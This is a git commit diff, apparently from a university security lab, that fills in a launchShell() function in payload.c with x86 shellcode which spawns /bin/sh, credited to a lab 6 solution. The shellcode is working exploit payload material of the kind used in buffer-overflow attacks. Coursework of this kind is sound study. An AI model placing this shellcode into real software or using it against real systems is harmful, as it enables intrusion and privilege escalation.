319002fa151ff7842e3449dad2f7af9f51bcbfb9
Tifenn Floch <floch.tifenn@yahoo.fr>
2019-11-11 16:51:17 +0000

    launch shell hex code from lab 6 solution

--- payload.c
+++ payload.c
@@ -16,11 +16,19 @@ setuid()
 	return "";
 }
 
+
+/**
+ From lab 6 solution to part C, by Darragh O'Brien
+ launches a shell
+*/
 char*
 launchShell()
 {
 
-	return "";
+	return 	"\xeb\x12\x5e\x31\xc0\x88\x46\x07"
+			"\x50\x56\x31\xd2\x89\xe1\x89\xf3"
+			"\xb0\x0b\xcd\x80\xe8\xe9\xff\xff"
+			"\xff\x2f\x62\x69\x6e\x2f\x73\x68";
 }
 
 void
